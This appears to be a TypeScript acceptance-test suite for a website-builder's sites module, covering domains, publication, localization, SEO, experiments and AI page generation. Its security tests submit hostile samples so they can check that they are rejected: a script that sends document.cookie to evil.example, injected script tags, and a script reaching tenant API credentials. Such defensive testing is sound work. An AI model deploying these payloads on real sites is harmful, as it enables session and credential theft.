import { randomUUID } from 'node:crypto';
import type { Generic, Probe } from './probe';
import { seedDriveFile } from './files';

const S = '/api/v1/sites';
type World = Awaited<ReturnType<typeof import('./fixtures')['sitesWorld']>>;
const s = (p: Probe) => p.x.s as World;
const providers = () => import('../../../src/server/suite/providers');

async function render(p: Probe, query: Record<string, string> = {}) {
  const qs = new URLSearchParams({ host: s(p).host, path: '/', ...query }).toString();
  return p.req('guest', 'GET', `/api/v1/public/sites/render?${qs}`);
}
async function release(p: Probe, actor: 'publisher' | 'owner' = 'publisher') {
  const candidate = await p.req(actor, 'POST', `${S}/${s(p).site.id}/releases/preview`, {});
  p.ok('release candidate compiled', candidate);
  const site = await p.q(db => db.site.findUniqueOrThrow({ where: { id: s(p).site.id } }));
  const published = await p.req(actor, 'POST', `${S}/${s(p).site.id}/releases/publish`, { releaseId: candidate.body.data?.id, expectedSiteVersion: site.siteVersion }, { 'Idempotency-Key': p.key('publish') });
  p.ok('release activated', published);
  return candidate.body.data as { id: string; manifest: { scripts: string[]; pages: { pageId: string }[] } };
}
const active = (p: Probe) => p.obs('site_releases', { siteId: s(p).site.id, status: 'ACTIVE' });
const blocksText = (res: { body: { data?: { blocks?: { props?: { text?: string } }[] } } }) => (res.body.data?.blocks ?? []).map(b => b.props?.text).filter(Boolean) as string[];
async function aiReturns(output: unknown, fail = false) {
  const { setAiGateway } = await providers();
  setAiGateway({ async runScenario() { if (fail) { const { AppError } = await import('../../../src/server/errors'); throw new AppError('DEPENDENCY_UNAVAILABLE', 'AI gateway request failed.', 503); } return { modelId: 'contract-model', output, inputTokens: 120, outputTokens: 80, costMicros: 2500 }; } });
}

export const sitesGeneric: Generic = {
  scenario: 'sites_publication',
  async foreign(p) { return { actor: 'publisher', path: `${S}/${p.ids.foreignSiteId}` }; },
  async mutation(p) {
    return { actor: 'publisher', deniedActor: 'employee', req: { method: 'POST', path: S, body: { name: 'Generic', type: 'LANDING', subdomain: 'gen-' + randomUUID().slice(0, 8), defaultLocale: 'en' } },
      count: () => p.q(db => db.site.count({ where: { workspaceId: p.f.workspaceId } })), resourceId: res => res.body.data?.id };
  },
  async idempotent(p) {
    const candidate = await p.req('publisher', 'POST', `${S}/${s(p).site.id}/releases/preview`, {});
    const site = await p.q(db => db.site.findUniqueOrThrow({ where: { id: s(p).site.id } }));
    return { actor: 'publisher', req: { method: 'POST', path: `${S}/${s(p).site.id}/releases/publish`, body: { releaseId: candidate.body.data?.id, expectedSiteVersion: site.siteVersion } },
      count: () => p.q(db => db.siteRelease.count({ where: { siteId: s(p).site.id, status: { in: ['ACTIVE', 'SUPERSEDED'] } } })), id: res => res.body.data?.id };
  },
};

export const sitesCases: Record<string, (p: Probe) => Promise<void>> = {
  // ------------------------------------------------------------ 01 hosting & domains
  async '01-sites-hosting-and-domains::AC01'(p) {
    const res = await p.req('publisher', 'POST', `${S}/${s(p).site.id}/domains`, { hostname: p.ids.foreignDomain });
    p.status('hostname registered by another workspace cannot be taken', res, [409]); p.code('domain conflict', res, ['DOMAIN_CONFLICT']);
    const row = await p.q(db => db.siteDomain.findUniqueOrThrow({ where: { hostname: p.ids.foreignDomain } }));
    p.check('domain ownership unchanged', row.siteId === p.ids.foreignSiteId && row.workspaceId === p.f.otherWorkspaceId);
  },
  async '01-sites-hosting-and-domains::AC02'(p) {
    const host = 'pending-' + randomUUID().slice(0, 8) + '.example.test';
    p.ok('pending domain added', await p.req('publisher', 'POST', `${S}/${s(p).site.id}/domains`, { hostname: host }));
    const res = await render(p, { host });
    p.status('unverified host serves nothing', res, [404]);
    p.ok('verified host serves the live release', await render(p));
  },
  async '01-sites-hosting-and-domains::AC03'(p) {
    const dup = await p.req('publisher', 'POST', S, { name: 'Clone', type: 'SITE', subdomain: s(p).site.subdomain, defaultLocale: 'en' });
    p.status('colliding managed subdomain rejected', dup, [409]);
    const other = await p.req('publisher', 'POST', S, { name: 'Other', type: 'SITE', subdomain: 'other-' + randomUUID().slice(0, 8), defaultLocale: 'en' });
    const host = await p.req('publisher', 'POST', `${S}/${other.body.data?.id}/domains`, { hostname: s(p).host });
    p.status('colliding custom host rejected', host, [409]);
    p.check('one route per host', (await p.q(db => db.siteHostRoute.count({ where: { hostname: s(p).host } }))) === 1);
  },
  // ------------------------------------------------------------ 02 pages, navigation, CMS
  async '02-pages-navigation-and-cms::AC01'(p) {
    const make = () => p.req('publisher', 'POST', `${S}/${s(p).site.id}/pages`, { slug: 'about', title: 'About' });
    p.ok('first page created', await make());
    const dup = await make();
    p.status('duplicate locale slug rejected', dup, [409]);
    p.check('one page for the route', (await p.q(db => db.sitePage.count({ where: { siteId: s(p).site.id, slug: 'about', locale: 'en' } }))) === 1);
  },
  async '02-pages-navigation-and-cms::AC02'(p) {
    const res = await p.req('publisher', 'PUT', `${S}/${s(p).site.id}/redirects`, { redirects: [{ fromPath: '/a', toPath: '/b', statusCode: 301 }, { fromPath: '/b', toPath: '/a', statusCode: 301 }] });
    p.status('redirect loop rejected', res, [409]); p.code('loop code', res, ['REDIRECT_LOOP']);
    p.check('no redirects persisted', (await p.q(db => db.siteRedirect.count({ where: { siteId: s(p).site.id } }))) === 0);
  },
  async '02-pages-navigation-and-cms::AC03'(p) {
    const page = await p.req('publisher', 'POST', `${S}/${s(p).site.id}/pages`, { slug: 'contact', title: 'Contact', blockTreeJson: { blocks: [{ type: 'headline', text: 'Contact' }] } });
    p.ok('draft navigation saved', await p.req('publisher', 'POST', `${S}/${s(p).site.id}/navigation`, { name: 'main', locale: 'en', items: [{ label: 'Contact', pageId: page.body.data?.id }] }));
    const before = await render(p);
    p.check('draft navigation not visible on the live site', (before.body.data?.navigation ?? []).length === 0, before.body.data?.navigation);
    await release(p);
    const after = await render(p);
    p.check('navigation visible after release activation', (after.body.data?.navigation ?? []).length === 1);
  },
  // ------------------------------------------------------------ 03 blocks & themes
  async '03-editor-blocks-and-themes::AC01'(p) {
    p.ok('shared header draft revision', await p.req('publisher', 'POST', `${S}/shared-blocks/${s(p).shared.id}/revisions`, { propsJson: { text: 'Header v2 draft' } }));
    const live = await render(p);
    p.check('live page keeps the pinned shared revision', blocksText(live).includes('Header v1') && !blocksText(live).includes('Header v2 draft'), blocksText(live));
    p.check('shared block published revision unchanged', (await p.q(db => db.siteSharedBlock.findUniqueOrThrow({ where: { id: s(p).shared.id } }))).publishedRevision === 1);
  },
  async '03-editor-blocks-and-themes::AC02'(p) {
    const before = await p.q(db => db.sitePageRevision.count({ where: { pageId: s(p).page.id } }));
    const res = await p.req('publisher', 'POST', `${S}/pages/${s(p).page.id}/revisions`, { blockTreeJson: { blocks: [{ type: 'headline', text: 'x', level: 9 }] } });
    p.status('invalid block props rejected', res, [400]);
    const script = await p.req('publisher', 'POST', `${S}/pages/${s(p).page.id}/revisions`, { blockTreeJson: { blocks: [{ type: 'text', text: '<script>alert(1)</script>' }] } });
    p.status('executable content rejected', script, [400]);
    p.check('no revision persisted', (await p.q(db => db.sitePageRevision.count({ where: { pageId: s(p).page.id } }))) === before);
  },
  async '03-editor-blocks-and-themes::AC03'(p) {
    const file = await seedDriveFile(p.db, p.f.workspaceId, p.w.users.publisher.id, Buffer.from([137, 80, 78, 71]), 'hero.png', 'PENDING');
    const res = await p.req('publisher', 'POST', `${S}/pages/${s(p).page.id}/revisions`, { blockTreeJson: { blocks: [{ type: 'image', fileId: file.id, alt: 'Hero' }] } });
    p.status('unscanned asset rejected', res, [409]); p.code('quarantine code', res, ['FILE_QUARANTINED']);
    p.check('asset never referenced by a revision', !(await p.q(db => db.sitePageRevision.findMany({ where: { pageId: s(p).page.id } }))).some(r => JSON.stringify(r.blockTree).includes(file.id)));
  },
  // ------------------------------------------------------------ 04 drafts, preview, publication
  async '04-drafts-preview-and-publication::AC01'(p) {
    p.ok('draft saved', await p.req('publisher', 'POST', `${S}/pages/${s(p).page.id}/revisions`, { blockTreeJson: { blocks: [{ type: 'headline', text: 'Another draft' }] } }));
    const live = await render(p);
    p.check('live page unchanged by drafts', blocksText(live).includes('Live headline') && !blocksText(live).some(t => /draft/i.test(t)), blocksText(live));
    p.check('active release unchanged', (await active(p)).map(r => r.id).join() === p.ids.releaseId);
  },
  async '04-drafts-preview-and-publication::AC02'(p) {
    const a = await p.req('publisher', 'POST', `${S}/${s(p).site.id}/releases/preview`, {}), b = await p.req('publisher', 'POST', `${S}/${s(p).site.id}/releases/preview`, {});
    const site = await p.q(db => db.site.findUniqueOrThrow({ where: { id: s(p).site.id } }));
    const publish = (id: string) => p.req('publisher', 'POST', `${S}/${s(p).site.id}/releases/publish`, { releaseId: id, expectedSiteVersion: site.siteVersion }, { 'Idempotency-Key': p.key('race') });
    const results = await Promise.all([publish(a.body.data?.id), publish(b.body.data?.id)]);
    p.check('exactly one concurrent publish wins', results.filter(r => r.status === 200).length === 1, results.map(r => r.status));
    p.check('loser gets a version conflict', results.some(r => r.body.error?.code === 'VERSION_CONFLICT'));
    p.check('single ACTIVE release', (await active(p)).length === 1);
  },
  async '04-drafts-preview-and-publication::AC03'(p) {
    const contact = await p.req('publisher', 'POST', `${S}/${s(p).site.id}/pages`, { slug: 'contact', title: 'Contact', blockTreeJson: { blocks: [{ type: 'text', text: 'Hi' }] } });
    await p.req('publisher', 'POST', `${S}/${s(p).site.id}/navigation`, { name: 'main', locale: 'en', items: [{ label: 'Contact', pageId: contact.body.data?.id }] });
    await p.req('publisher', 'POST', `${S}/shared-blocks/${s(p).shared.id}/revisions`, { propsJson: { text: 'Header v2' }, publish: true });
    await release(p);
    const changed = await render(p);
    p.check('new release shows v2 header and navigation', blocksText(changed).includes('Header v2') && (changed.body.data?.navigation ?? []).length === 1);
    const rollback = await p.req('publisher', 'POST', `${S}/${s(p).site.id}/releases/${p.ids.releaseId}/rollback`, {}, { 'Idempotency-Key': p.key('rollback') });
    p.ok('rollback activated', rollback);
    const restored = await render(p);
    p.check('rollback restores pinned shared block and navigation', blocksText(restored).includes('Header v1') && (restored.body.data?.navigation ?? []).length === 0, { blocks: blocksText(restored), nav: restored.body.data?.navigation });
    p.check('rollback is a new audited release', rollback.body.data?.id !== p.ids.releaseId && (await p.obs('audit_events', { resourceId: s(p).site.id, action: 'SITE_RELEASE_ROLLED_BACK' })).length === 1);
  },
  // ------------------------------------------------------------ 05 localization
  async '05-localization-and-rtl::AC01'(p) {
    p.ok('Arabic enabled', await p.req('publisher', 'POST', `${S}/${s(p).site.id}/languages`, { locale: 'ar', enabled: true }));
    const page = await p.req('publisher', 'POST', `${S}/${s(p).site.id}/pages`, { slug: '', title: 'الرئيسية', locale: 'ar', blockTreeJson: { blocks: [{ type: 'headline', text: 'مرحبا' }] } });
    await p.req('publisher', 'POST', `${S}/${s(p).site.id}/navigation`, { name: 'main', locale: 'ar', items: [{ label: 'الرئيسية', pageId: page.body.data?.id }] });
    await release(p);
    const res = await render(p, { lang: 'ar' });
    p.check('RTL direction and Arabic lang', res.body.data?.html?.dir === 'rtl' && res.body.data?.html?.lang === 'ar', res.body.data?.html);
    p.check('Arabic navigation rendered', (res.body.data?.navigation ?? []).some((n: { locale: string }) => n.locale === 'ar'));
  },
  async '05-localization-and-rtl::AC02'(p) {
    p.ok('French enabled with default fallback', await p.req('publisher', 'POST', `${S}/${s(p).site.id}/languages`, { locale: 'fr', enabled: true, fallbackPolicy: 'DEFAULT_LANGUAGE' }));
    await release(p);
    const res = await render(p, { lang: 'fr' });
    p.ok('fallback page served', res);
    p.check('fallback metadata correct', res.body.data?.translationFallback === true && res.body.data?.html?.lang === 'en' && res.body.data?.requestedLocale === 'fr', res.body.data);
    p.check('no false hreflang for the missing translation', (res.body.data?.seo?.alternates ?? []).length === 0);
  },
  async '05-localization-and-rtl::AC03'(p) {
    await p.req('publisher', 'POST', `${S}/${s(p).site.id}/languages`, { locale: 'fr', enabled: true });
    await aiReturns({ blocks: [{ type: 'headline', text: 'Bonjour IA' }] });
    const tr = await p.req('publisher', 'POST', `${S}/pages/${s(p).page.id}/translations`, { targetLocale: 'fr', useAi: true });
    p.ok('AI translation drafted', tr);
    await release(p);
    const res = await render(p, { lang: 'fr' });
    p.check('unreviewed AI draft not public', !JSON.stringify(res.body).includes('Bonjour IA'), res.status);
    p.check('translation awaiting review', (await p.q(db => db.siteTranslation.findUniqueOrThrow({ where: { id: tr.body.data?.id } }))).status === 'IN_REVIEW');
  },
  // ------------------------------------------------------------ 06 SEO
  async '06-seo-search-and-performance::AC01'(p) {
    await p.req('publisher', 'POST', `${S}/${s(p).site.id}/pages`, { slug: 'draft-only', title: 'Draft', blockTreeJson: { blocks: [{ type: 'text', text: 'Draft' }] } });
    const map = await p.req('guest', 'GET', `/api/v1/public/sitemap.xml?host=${s(p).host}`);
    p.ok('sitemap served', map);
    const xml = JSON.stringify(map.body);
    p.check('live page listed', xml.includes(s(p).host));
    p.check('draft page excluded', !xml.includes('draft-only'));
  },
  async '06-seo-search-and-performance::AC02'(p) {
    const res = await render(p);
    p.check('canonical uses the verified hostname', String(res.body.data?.seo?.canonical).startsWith('https://' + s(p).host), res.body.data?.seo?.canonical);
    const pending = 'unverified-' + randomUUID().slice(0, 6) + '.example.test';
    await p.req('publisher', 'POST', `${S}/${s(p).site.id}/domains`, { hostname: pending, isPrimary: true });
    p.check('unverified hostname never becomes canonical', !String((await render(p)).body.data?.seo?.canonical).includes(pending));
  },
  async '06-seo-search-and-performance::AC03'(p) {
    const before = (await render(p)).body.data?.cacheKey as string;
    await p.req('publisher', 'POST', `${S}/pages/${s(p).page.id}/revisions`, { blockTreeJson: { blocks: [{ type: 'headline', text: 'Fresh' }] } });
    const next = await release(p);
    const after = (await render(p)).body.data?.cacheKey as string;
    p.check('new cache version exposed immediately', before !== after && after.includes(next.id), { before, after });
    p.check('CDN invalidation requested', (await p.obs('outbox_events', { resourceId: s(p).site.id, eventType: 'CDN_INVALIDATION_REQUESTED' })).length >= 2);
  },
  // ------------------------------------------------------------ 07 form/commerce/widget blocks
  async '07-form-commerce-and-widget-blocks::AC01'(p) {
    const missing = await p.req('publisher', 'POST', `${S}/pages/${s(p).page.id}/module-bindings`, { blockKey: 'signup', module: 'FORM', externalResourceId: randomUUID() });
    p.status('unknown/broken form is never bound as working', missing, [403, 404]);
    const listing = await p.q(async db => {
      const store = await db.commerceStore.create({ data: { workspaceId: p.f.workspaceId, code: 'B_' + randomUUID().slice(0, 6).toUpperCase(), name: 'Broken', defaultCurrency: 'EGP', timezone: 'Africa/Cairo', catalogId: randomUUID(), createdByUserId: p.w.users.owner.id, status: 'ACTIVE' } });
      return db.commerceProductPublication.create({ data: { workspaceId: p.f.workspaceId, storeId: store.id, productId: randomUUID(), inventoryKey: randomUUID(), seoSlug: 'gone-' + randomUUID().slice(0, 6), published: false, createdByUserId: p.w.users.owner.id } });
    }).catch(() => null);
    if (listing) {
      const bound = await p.req('publisher', 'POST', `${S}/pages/${s(p).page.id}/module-bindings`, { blockKey: 'product', module: 'PRODUCT', externalResourceId: listing.id });
      p.check('broken dependency recorded as BROKEN', bound.body.data?.status === 'BROKEN', bound.body.data?.status);
      const block = await p.req('guest', 'GET', `/api/v1/public/sites/${s(p).site.subdomain}/commerce-blocks/${bound.body.data?.id}`);
      p.check('public block shows an honest unavailable state', block.body.data?.state === 'UNAVAILABLE', block.body.data);
    }
    p.check('no lead fabricated', (await p.q(db => db.outboxEvent.count({ where: { workspaceId: p.f.workspaceId, eventType: { contains: 'LEAD' } } }))) === 0);
  },
  async '07-form-commerce-and-widget-blocks::AC02'(p) {
    const foreignStore = await p.q(db => db.commerceStore.create({ data: { workspaceId: p.f.otherWorkspaceId, code: 'F_' + randomUUID().slice(0, 6).toUpperCase(), name: 'Foreign', defaultCurrency: 'EGP', timezone: 'Africa/Cairo', catalogId: randomUUID(), createdByUserId: p.w.users.outsider.id, status: 'ACTIVE' } }));
    const res = await p.req('publisher', 'POST', `${S}/pages/${s(p).page.id}/module-bindings`, { blockKey: 'checkout', module: 'CHECKOUT', externalResourceId: foreignStore.id });
    p.status('other-workspace commerce resource rejected', res, [403, 404]);
    p.check('no binding persisted', (await p.q(db => db.siteModuleBinding.count({ where: { siteId: s(p).site.id } }))) === 0);
  },
  async '07-form-commerce-and-widget-blocks::AC03'(p) {
    const res = await p.req('guest', 'POST', `/api/v1/public/checkout-sessions/${p.ids.unavailableCheckoutSessionId}/confirm`, { acceptedQuoteVersion: 1 }, { 'Idempotency-Key': p.key('block') });
    p.status('checkout block surfaces the real Commerce outcome', res, [409, 503]);
    p.check('never claims success', res.body.success === false);
    p.check('no order created', (await p.q(db => db.commerceOrder.count({ where: { checkoutSessionId: p.ids.unavailableCheckoutSessionId } }))) === 0);
  },
  // ------------------------------------------------------------ 08 cookies & scripts
  async '08-cookies-scripts-and-security::AC01'(p) {
    const script = await p.req('publisher', 'POST', `${S}/${s(p).site.id}/scripts`, { kind: 'INTEGRATION', language: 'JS', source: 'window.analyticsReady = true;', allowedCategory: 'ANALYTICS' });
    p.ok('script approved by a separate reviewer', await p.req('owner', 'POST', `${S}/scripts/${script.body.data?.id}/approve`, { decision: 'APPROVE' }));
    await release(p);
    const noConsent = await render(p), consent = await render(p, { consent: 'ANALYTICS' });
    p.check('analytics tag absent before opt-in', (noConsent.body.data?.scripts ?? []).length === 0);
    p.check('analytics tag loaded after opt-in', (consent.body.data?.scripts ?? []).some((x: { id: string }) => x.id === script.body.data?.id));
  },
  async '08-cookies-scripts-and-security::AC02'(p) {
    const res = await p.req('publisher', 'POST', `${S}/${s(p).site.id}/scripts`, { kind: 'CUSTOM', language: 'JS', source: 'fetch("https://evil.example/?c="+document.cookie)', allowedCategory: 'MARKETING' });
    p.status('malicious script rejected', res, [400]);
    p.check('nothing stored', (await p.q(db => db.siteScript.count({ where: { siteId: s(p).site.id } }))) === 0);
  },
  async '08-cookies-scripts-and-security::AC03'(p) {
    const script = await p.req('publisher', 'POST', `${S}/${s(p).site.id}/scripts`, { kind: 'INTEGRATION', language: 'JS', source: 'window.chat = 1;', allowedCategory: 'MARKETING' });
    await p.req('owner', 'POST', `${S}/scripts/${script.body.data?.id}/approve`, { decision: 'APPROVE' });
    const first = await release(p);
    p.check('approved script pinned into the release', first.manifest.scripts.includes(script.body.data?.id));
    p.ok('script revoked', await p.req('owner', 'POST', `${S}/scripts/${script.body.data?.id}/approve`, { decision: 'REVOKE' }));
    const next = await release(p);
    p.check('revoked script omitted from the next release', !next.manifest.scripts.includes(script.body.data?.id));
    const creds = await p.req('publisher', 'POST', `${S}/${s(p).site.id}/scripts`, { kind: 'CUSTOM', language: 'JS', source: 'fetch("/api/v1/crm/contacts",{headers:{Authorization:"Bearer x"}})', allowedCategory: 'MARKETING' });
    p.status('scripts cannot reach tenant API credentials', creds, [400]);
    const csp = await p.req('publisher', 'GET', `${S}/${s(p).site.id}/security-preview`);
    p.check('sandbox isolation documented in the policy preview', String(csp.body.data?.sandbox).includes('never exposed'));
  },
  // ------------------------------------------------------------ 09 experiments
  async '09-ab-experiments::AC01'(p) {
    const live = await p.q(db => db.sitePageRevision.findFirstOrThrow({ where: { pageId: s(p).page.id, status: 'ACTIVE' } }));
    const alt = await p.req('publisher', 'POST', `${S}/pages/${s(p).page.id}/revisions`, { blockTreeJson: { blocks: [{ type: 'headline', text: 'Variant B' }] } });
    p.ok('variant revision approved', await p.req('publisher', 'POST', `${S}/revisions/${alt.body.data?.id}/approve`, {}));
    const exp = await p.req('publisher', 'POST', `${S}/pages/${s(p).page.id}/experiments`, { metric: 'CONVERSION_RATE', goalEvent: 'signup', variants: [{ label: 'A', pageRevisionId: live.id, trafficPercent: 50 }, { label: 'B', pageRevisionId: alt.body.data?.id, trafficPercent: 50 }] });
    p.ok('experiment created', exp);
    await p.req('publisher', 'POST', `${S}/experiments/${exp.body.data?.id}/activate`, {});
    const visit = () => p.req('guest', 'POST', `/api/v1/public/sites/${s(p).site.id}/experiment-events`, { experimentId: exp.body.data?.id, visitorKey: 'visitor_key_0000000001', eventType: 'view', consent: 'GRANTED' });
    const a = await visit(), b = await visit();
    p.check('repeat visit sees the same variant', a.body.data?.variantId === b.body.data?.variantId && Boolean(a.body.data?.variantId));
    p.check('single persisted assignment', (await p.q(db => db.siteVisitorAssignment.count({ where: { experimentId: exp.body.data?.id } }))) === 1);
  },
  async '09-ab-experiments::AC02'(p) {
    const live = await p.q(db => db.sitePageRevision.findFirstOrThrow({ where: { pageId: s(p).page.id, status: 'ACTIVE' } }));
    const res = await p.req('publisher', 'POST', `${S}/pages/${s(p).page.id}/experiments`, { metric: 'CLICK_RATE', goalEvent: 'click', variants: [{ label: 'A', pageRevisionId: live.id, trafficPercent: 70 }, { label: 'B', pageRevisionId: live.id, trafficPercent: 40 }] });
    p.status('allocation above 100 rejected', res, [400]);
    p.check('no experiment persisted', (await p.q(db => db.siteExperiment.count({ where: { siteId: s(p).site.id } }))) === 0);
  },
  async '09-ab-experiments::AC03'(p) {
    const live = await p.q(db => db.sitePageRevision.findFirstOrThrow({ where: { pageId: s(p).page.id, status: 'ACTIVE' } }));
    const exp = await p.req('publisher', 'POST', `${S}/pages/${s(p).page.id}/experiments`, { metric: 'CLICK_RATE', goalEvent: 'click', variants: [{ label: 'A', pageRevisionId: live.id, trafficPercent: 50 }, { label: 'B', pageRevisionId: live.id, trafficPercent: 50 }] });
    await p.req('publisher', 'POST', `${S}/experiments/${exp.body.data?.id}/activate`, {});
    const res = await p.req('guest', 'POST', `/api/v1/public/sites/${s(p).site.id}/experiment-events`, { experimentId: exp.body.data?.id, visitorKey: 'visitor_key_0000000002', eventType: 'view', consent: 'DENIED' });
    p.check('no persistent tracking cookie without consent', res.body.data?.persisted === false && res.body.data?.setCookie === false, res.body.data);
    p.check('no assignment or event stored', (await p.q(db => db.siteVisitorAssignment.count({ where: { experimentId: exp.body.data?.id } }))) === 0 && (await p.q(db => db.siteExperimentEvent.count({ where: { experimentId: exp.body.data?.id } }))) === 0);
  },
  // ------------------------------------------------------------ 10 AI
  async '10-ai-generation-and-templates::AC01'(p) {
    await aiReturns({ blocks: [{ type: 'text', text: '<script>steal()</script>' }] });
    const res = await p.req('publisher', 'POST', `${S}/${s(p).site.id}/ai/generate`, { brief: 'Landing page for spring sale', requestKey: p.key('ai') });
    p.check('AI output with executable content rejected', res.body.data?.status === 'FAILED' && res.body.data?.errorCode === 'AI_OUTPUT_REJECTED', res.body.data ?? res.body.error);
    p.check('no revision created from rejected output', (await p.q(db => db.sitePageRevision.count({ where: { siteId: s(p).site.id, origin: 'AI' } }))) === 0);
  },
  async '10-ai-generation-and-templates::AC02'(p) {
    await aiReturns({ blocks: [{ type: 'headline', text: 'Spring sale' }, { type: 'text', text: 'Up to 30% off.' }] });
    const before = (await active(p)).map(r => r.id).join();
    const res = await p.req('publisher', 'POST', `${S}/${s(p).site.id}/ai/generate`, { brief: 'Landing page for spring sale', requestKey: p.key('ai') });
    p.ok('AI draft generated', res);
    p.check('draft awaits review', res.body.data?.status === 'PENDING_REVIEW');
    p.check('no publication on generation', (await active(p)).map(r => r.id).join() === before);
    p.check('generated content not on the live site', !JSON.stringify((await render(p)).body).includes('Spring sale'));
  },
  async '10-ai-generation-and-templates::AC03'(p) {
    await aiReturns({ blocks: [{ type: 'headline', text: 'Costed' }] });
    const ok = await p.req('publisher', 'POST', `${S}/${s(p).site.id}/ai/generate`, { brief: 'Costed landing page', requestKey: p.key('ai') });
    const usage = await p.req('publisher', 'GET', `${S}/ai-drafts/${ok.body.data?.id}/usage`);
    p.check('cost reported by workspace, user and scenario', usage.body.data?.costMicros === '2500' && usage.body.data?.workspaceTotals?.costMicros === '2500' && usage.body.data?.userScenarioCostMicros === '2500', usage.body.data);
    await aiReturns(null, true);
    const key = p.key('ai-fail');
    const failed = await p.req('publisher', 'POST', `${S}/${s(p).site.id}/ai/generate`, { brief: 'Failing landing page', requestKey: key });
    const retry = await p.req('publisher', 'POST', `${S}/${s(p).site.id}/ai/generate`, { brief: 'Failing landing page', requestKey: key });
    p.status('gateway failure surfaced', failed, [503]);
    p.check('failure recorded once, not billed', (await p.q(db => db.siteAiDraft.findMany({ where: { usageKey: { endsWith: ':' + key } } }))).every(d => !d.billed) && (await p.q(db => db.siteAiDraft.count({ where: { usageKey: { endsWith: ':' + key } } }))) === 1, retry.status);
  },
  // ------------------------------------------------------------ 11 recovery, exports, entitlements
  async '11-recovery-exports-and-entitlements::AC01'(p) {
    const page = await p.req('publisher', 'POST', `${S}/${s(p).site.id}/pages`, { slug: 'temp', title: 'Temp' });
    const before = await p.obs('audit_events', { resourceId: s(p).site.id });
    p.ok('page archived', await p.req('publisher', 'POST', `${S}/pages/${page.body.data?.id}/archive`, { reason: 'Obsolete' }));
    const after = await p.obs('audit_events', { resourceId: s(p).site.id });
    p.check('prior audit entries untouched', before.every(b => after.some(a => a.id === b.id)));
    p.check('deletion audited', after.some(a => a.action === 'PAGE_ARCHIVED'));
  },
  async '11-recovery-exports-and-entitlements::AC02'(p) {
    const ws = await p.q(db => db.workspace.findUniqueOrThrow({ where: { id: p.f.workspaceId } }));
    await p.q(db => db.workspace.update({ where: { id: ws.id }, data: { settings: { ...(ws.settings as object), entitlements: { sites: false, sitesExpiredAt: '2020-01-01T00:00:00Z', commerceCheckout: false } } } }));
    const impact = await p.req('publisher', 'GET', `${S}/${s(p).site.id}/entitlement-impact`);
    p.check('publish blocked and checkout disabled after grace', impact.body.data?.publish === 'BLOCKED' && impact.body.data?.checkoutBlocks === 'DISABLED', impact.body.data);
    const publish = await p.req('publisher', 'POST', `${S}/${s(p).site.id}/releases/preview`, {});
    p.status('new publication blocked', publish, [403]);
    p.ok('valid public content still served read-only', await render(p));
  },
  async '11-recovery-exports-and-entitlements::AC03'(p) {
    await p.req('publisher', 'POST', `${S}/${s(p).site.id}/scripts`, { kind: 'INTEGRATION', language: 'JS', source: 'window.secretMarker = "do-not-export";', allowedCategory: 'MARKETING' });
    const job = await p.req('publisher', 'POST', `${S}/${s(p).site.id}/export`, {});
    p.ok('export prepared', job);
    const download = await p.req('guest', 'GET', String(job.body.data?.downloadPath));
    p.ok('signed export downloadable', download);
    const text = JSON.stringify(download.body), domain = s(p).domain as { dnsChallenge: { value: string } };
    p.check('export excludes secrets, script sources and verification tokens', !text.includes('do-not-export') && !text.includes(domain.dnsChallenge.value) && !/credentialSecretRef|webhookSecretRef|tokenHash/.test(text));
    p.check('exclusions declared', text.includes('provider credentials'));
  },
};
